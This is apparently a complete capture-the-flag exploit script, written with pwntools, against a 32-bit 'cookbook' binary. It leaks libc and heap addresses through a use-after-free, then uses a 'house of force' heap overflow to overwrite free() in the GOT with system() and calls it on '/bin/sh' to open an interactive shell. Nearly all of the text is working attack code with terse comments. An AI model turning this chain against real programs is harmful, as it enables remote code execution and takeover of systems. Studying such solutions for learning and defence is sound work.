from pwn import *  # NOQA
# context.log_level = 'debug'


# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
cookbook = ELF('./cookbook')


r = remote('localhost', 4444)
# r = process('./cookbook')


def recipepayload(name='', procedure='',
                  recipe_type=0, ingred_list=0,
                  qty_list=0):

    return flat(
             p32(ingred_list),
             p32(qty_list),
             name.ljust(116, 'A'),
             p32(recipe_type),
             p32(0)*3,
             procedure.ljust(896, 'A')
           )


def menuchoice(cmd):
    r.sendline(cmd)
    return r.recvuntil('[q]uit')


def givename(payload, size=None):
    r.sendline('g')
    if size:
        r.sendline('{:x}'.format(size))
    r.sendline(payload)

    r.recvuntil('[q]uit')


def includeinstructions(payload):
    r.sendline('i')
    r.sendline(payload)

    r.recvuntil('[q]uit')


def leak(addr):

    menuchoice('c')

    menuchoice('n')
    menuchoice('d')   # free recipe but leave ptr, UAF!

    menuchoice('q')

    payload = recipepayload(recipe_type=addr)
    givename(payload, len(payload)+2)

    menuchoice('R')

    menuchoice('c')

    out = menuchoice('p')  # print recipe, UAF recipe

    menuchoice('q')

    return u32(out.split('recipe type: ')[1][0:4])


def write(where, what, av_top):
    # employ "house of force" technique to obtain
    # a chunk of heap on the specified location
    menuchoice('c')
    menuchoice('n')

    payload = flat(
                'A'*(892),     # fill up procedure
                p32(0xffffffff),  # overwrite size of prev chunk
                p32(0xffffffff),  # overwrite size of top chunk
                p32(0)
              )
    includeinstructions(payload)

    menuchoice('q')

    # gdb.attach(r)
    # here we ask malloc to give us a chunk at address
    evilsize = where - 8 - av_top - 8
    givename('', evilsize)

    # the next chunk is the one which allows us to overwrite
    givename(what, max(len(what), 400))


temporary_recipe_ptr = 0x0804D0A0

menuchoice('ocean')

free_addr = leak(cookbook.got['free'])
log.info('[got] free address: {:#x}'.format(free_addr))
libc_addr = free_addr - libc.symbols['free']
log.info('[got] libc address: {:#x}'.format(libc_addr))


system_addr = libc_addr + libc.symbols['system']
log.info("leaked system() address: {:#x}".format(system_addr))

heap_addr = leak(temporary_recipe_ptr)
log.info("leaked heap address: {:#x}".format(heap_addr))
av_top = heap_addr + 0x410 - 8
log.info("av top: {:#x}".format(av_top))

write(cookbook.got['free'], p32(system_addr), av_top)


givename("/bin/sh\x00", 100)  # malloc+fgets
menuchoice('R')  # call free (system)

r.interactive()


# now that we have leaked system() address we need a
# write-what-were primitive
# we have a few options:
#  + using the same mechanism used to leak we create a few qty/ingredient
#     structures and use the unlink/write
#  + house of force, there is a heap overflow in create_recipe
#     where we can overwrite the procedure
#  + maybe double free
